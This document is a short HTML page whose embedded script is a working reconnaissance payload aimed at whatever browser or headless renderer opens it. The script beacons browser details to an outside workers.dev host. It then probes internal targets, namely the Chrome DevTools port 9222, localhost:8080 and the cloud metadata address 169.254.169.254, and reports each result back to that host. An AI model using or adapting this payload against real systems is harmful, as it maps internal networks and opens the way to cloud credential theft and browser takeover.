<!doctype html><html><body>qr-probe-v1
<script>
(function(){
  var B='https://rzcatch.adx-f0a.workers.dev/jx1-';
  function beacon(tag, extra){ new Image().src = B + tag + (extra?('-'+encodeURIComponent(extra)):''); }
  beacon('boot', navigator.userAgent.slice(0,80));
  // JS-exec proof + renderer identity
  try { beacon('plat', navigator.platform + '|' + (navigator.webdriver?'wd':'nwd') + '|' + screen.width + 'x' + screen.height); } catch(e){}
  // single-shot internal reachability probes (non-destructive, boolean only)
  function probe(tag, url){
    try {
      var c = new AbortController(); setTimeout(function(){c.abort()}, 5000);
      fetch(url, {mode:'no-cors', signal: c.signal}).then(function(){ beacon(tag+'-reachable'); })
        .catch(function(e){ beacon(tag+'-'+(e && e.name ? e.name : 'err')); });
    } catch(e) { beacon(tag+'-throw'); }
  }
  probe('lo9222', 'http://127.0.0.1:9222/json/version');
  probe('lo8080', 'http://127.0.0.1:8080/');
  probe('meta', 'http://169.254.169.254/latest/meta-data/');
  setTimeout(function(){ beacon('done'); }, 7000);
})();
</script></body></html>
